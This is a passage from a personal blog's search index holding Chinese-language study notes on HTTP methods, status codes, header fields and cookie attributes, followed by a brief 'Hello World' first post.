协议规定，请求从客户端发出，最后服务器端响应该请求并返回。</p><p>​ <strong>请求报文</strong>：主要由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成。</p><p>​<strong>响应报文</strong>：基本由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体构成。 </p><h5 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h5><pre class="language-none"><code class="language-none">**GET: 获取资源**GET方法用来请求访问已被 URI 识别的资源**POST: 传输实体主体****PUT： 传输文件**由于PUT方法自身不带验证机制，存在安全性问题，一般的 Web 网站不使用该方法**HEARD ：获取报文首部**不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等**DELETE： 删除文件****OPTIONS： 查询支持方法**用来查询针对URI指定的资源支持的方法**TRACE: 追踪路径**让 Web 服务器端将之前的请求通信环回给客户端的方法。客户端通过 TRACE 方法可以查询发送出去的请求是怎样被加工修改/篡改的。容易引发XST攻击**CONNECT：要求用隧道协议连接代理**方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（安全套接层）和 TLS（传输层安全）协议把通信内容加密后经网络隧道传输。</code></pre><p>​管线化：利用持久化连接，发送请求后不用等待回应就可直接发送下一个请求。</p><p>​<strong>Cookie</strong>:通常用于判断两个请求是否来自同一浏览器，Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态 。</p><h3 id="http报文"><a href="#http报文" class="headerlink" title="http报文"></a>http报文</h3><hr><h4 id="HTTP信息"><a href="#HTTP信息" class="headerlink" title="HTTP信息"></a>HTTP信息</h4><p>​首部内容：请求行、状态行、首部字段</p><p>​报文：是 HTTP 通信中的基本单位，由 8 位组字节流组成，通过 HTTP 通信传输。 </p><p>​实体：作为请求或响应的有效载荷数据（补充项）被传输，其内容由实 体首部和实体主体组成。 </p><p>​常见压缩传输的内容编码：gzip、compress、deflate、identity</p><h5 id="多部分对象集合"><a href="#多部分对象集合" class="headerlink" title="多部分对象集合"></a>多部分对象集合</h5><ul><li><p>multipart/form-data</p><p>​web表单文件上传时使用</p></li><li><p>multipart/byteranges</p><p>​状态码206响应报文包含了多个范围的内容时使用</p><p>获取部分内容的范围请求：用到首部字段Range来指定资源的byte范围</p><p>内容协商技术：服务器驱动协商、客户端驱动协商、透明协商</p></li></ul><h3 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h3><hr><h5 id="状态码类别"><a href="#状态码类别" class="headerlink" title="状态码类别"></a>状态码类别</h5><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>信息性状态码</td><td>接收的请求正在处理</td></tr><tr><td>2XX</td><td>成功状态码</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>重向状态码</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>客户端错误状态码</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>服务器错误状态码</td><td>服务器处理出错</td></tr></tbody></table><h5 id="14种常见的状态码"><a href="#14种常见的状态码" class="headerlink" title="14种常见的状态码"></a>14种常见的状态码</h5><pre class="language-none"><code class="language-none">**200 OK**请求被正常处理**204 No Content**请求已成功处理，但响应报文中不含实体的主体部分，也不允许返回任何实体的主体**206 Partial Content**客户端进行了范围请求，服务器成功执行请求，响应报文中包含由Content-Range指定范围的实体范围**301 Moved Permanently**永久性定向。--请求的资源已经被分配到了新的URI**302 Found**临时性重定向。**303 See Other**表示请求对应的资源存在另一个URI，应使用GET方法定向获取请求资源**304 Not Modified**无需再次传输请求的内容，可以使用缓存的内容。**307 Temporary Redirect**临时重定向,保持原有信息**400 Bad Request**报文中存在语法错误，需要修改请求重新发送**401 Unauthorized**表示发送请求需要有通过HTTP认证的认证信息，若之前进行过1次请求，则表示用户认证失败**403 Forbidden请求资源的访问被服务器拒绝**404 Not Found**服务器上无法找到请求的资源**500 Internal Server Error**服务器在执行请求时发生了错误，也有可能是Web应用存在的bug或临时的故障**503 Service Unavailable**服务器暂时处于超负载或正在进行停机维护，现在无法处理请求</code></pre><h3 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h3><hr><h4 id="通信数据转发程序"><a href="#通信数据转发程序" class="headerlink" title="通信数据转发程序"></a>通信数据转发程序</h4><pre class="language-none"><code class="language-none">**代理**作为客户端和服务器的‘中间人’缓存代理：会预先把资源的副本（缓存）保存在代理服务器上透明代理：转发请求或响应时，不对报文做任何加工代理**网关**转发来自其他服务器通信数据的服务器，对客户端的请求进行处理网关可以使通信线路上的服务器提供非HTTP协议服务，提高安全性。**隧道**是在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序目的是为了进行安全的通信</code></pre><h5 id="http出现之前的协议"><a href="#http出现之前的协议" class="headerlink" title="http出现之前的协议"></a>http出现之前的协议</h5><p>​FTP:传输文件时使用的协议</p><p>​NNTP：用于 NetNews 电子会议室内传送消息的协议 </p><p>​Archie ：搜索 anonymous FTP 公开的文件信息的协议 </p><p>​WAIS ：以关键词检索多个数据库使用的协议 </p><p>​Gopher ：查找与互联网连接的计算机内信息的协议 </p><h3 id="HTTP首部"><a href="#HTTP首部" class="headerlink" title="HTTP首部"></a>HTTP首部</h3><p>​首部字段结构：手段字段名：字段值</p><h5 id="通用首部"><a href="#通用首部" class="headerlink" title="通用首部"></a>通用首部</h5><pre class="language-none"><code class="language-none">**Cache-Control 控制缓存的行为**指令:public 表明其他用户也可利用缓存 private 响应只能以特殊用户作为对象 no-cache 用户端不接受缓存过的响应，缓存服务器不能进行缓存 no-store 表明请求和响应中包含机密信息，不能进行缓存 s-maxage=...（秒）    指定缓存期限和认证的指令 min-fresh=...（秒）指示客户端允许存储的响应至少 N 秒是新鲜的 max-stale=...（秒）可指示缓存资源，处于指定范围内，过期也可以接受。 only-if-cached客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回 must—revalidate代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。 proxy-revalidate缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性 no-transform 缓存都不能改变实体主体的媒体类型 **Connection 逐跳首部、连接的管理**指令close 服务器想断开连接 Keep-Alive 旧版本http协议实现持久化连接**Date 创建报文的日期时间**格式：如Tue, 03 Jul 2012 04:40:59 GM或者Tue Jul 03 04:40:59 2012**Pragma 报文指令**指令：no-cache 只在客户端请求中，所有中间服务器不返回缓存资源**Trailer 报文末端的首部一览**允许发送方在分块发送的消息后面添加额外的元信息**Transfer-Encoding 指定报文主体的传输编码方式****Upgrade 升级为其他协议****Via 代理服务器的相关信息**追踪报文传输路径**Warning 错误通知**格式：[警告码][警告的主机:端口号]“[警告内容]”([日期时间])</code></pre><h5 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Accept 用户代理可处理的媒体类型**q=（0-1）用来权衡优先级，默认为1，前用；间隔**Accept-Charset 优先的字符集****Accept-Encoding 优先的内容编码**内容编码优先级**Accept-Language 优先的语言（自然语言）****Authorization Web认证信息****Expect 期待服务器的特定行为**错误返回状态码417 Expectation Failed**From 用户的电子邮箱地址****Host 请求资源所在服务器****If-Match 比较实体标记（ETag）**If-xxx 为条件请求，条件为真时执行*If-Modified-Since 比较资源的更新时间*如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应**If-None-Match 比较实体标记（与 If-Match 相反）****If-Range 资源未更新时发送实体 Byte 的范围请求**If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。**Max-Forwards 最大传输逐跳数**当值为0时，经过的服务器不在进行转发，直接返回响应**Proxy-Authorization 代理服务器要求客户端的认证信息****Range 实体的字节范围请求****Referer 对请求中URI的原始获取方****TE 传输编码的优先级****User-Agent 客户端程序的信息**将创建的请求的浏览器和用户代理名称等信息传达给服务器</code></pre><h5 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h5><pre class="language-none"><code class="language-none">首部字段名    说明**Accept-Ranges 是否接受字节范围请求****Age 推算资源创建经过时间****ETag 资源的匹配信息**用户端实体标识**Location 令客户端重定向至指定URI****Proxy-Authenticate 代理服务器对客户端的认证信息**服务器是安装http服务器的应用程序是信息**Retry-After 对再次发起请求的时机要求****Server     HTTP服务器的安装信息**服务器是安装http服务器的应用程序是信息**Vary 代理服务器缓存的管理信息****WWW-Authenticate 服务器对客户端的认证信息**http访问认证</code></pre><h5 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Allow 资源可支持的HTTP方法****Content-Encoding 实体主体适用的编码方式****Content-Language 实体主体的自然语言****Content-Length 实体主体的大小（单位：字节）****Content-Location 替代对应资源的URI****Content-MD5 实体主体的报文摘要**判断报文的准确性**Content-Range 实体主体的位置范围****Content-Type 实体主体的媒体类型****Expires 实体主体过期的日期时间****Last-Modified 资源的最后修改日期时间**</code></pre><h5 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 Cookie 服务的首部字段</h5><pre class="language-none"><code class="language-none">**Set-Cookie**expires:浏览器可发送cookie的有效期path：限定cookie发送范围的文件目录domain：指定域名与结尾匹配可发送cookiesecure：web仅在HTTPS时，才发送cookieHttpOnly：使JavaScript无法获取cookie，防止xss攻击对信息的窃取</code></pre><h5 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h5><pre class="language-none"><code class="language-none">**X-Frame-Options 用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题 **响应首部DENY：拒绝SAMEORIGIN：仅同域名下页面匹配时许可**X-XSS-Protection 于控制浏览器 XSS 防护机制的开关**响应首部0：无效1： 有效**DNT 拒绝个人信息被收集**请求首部0：同意被跟踪1：拒绝被跟踪*P3P 在线隐私偏好平台**</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/07/19/hello-world/"/>
      <url>/2023/07/19/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h2><p>​不知道怎么看别人大佬的文章都是好看的博客，也非常系统，然后就想建个自己的博客。成功搭建博客系统。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
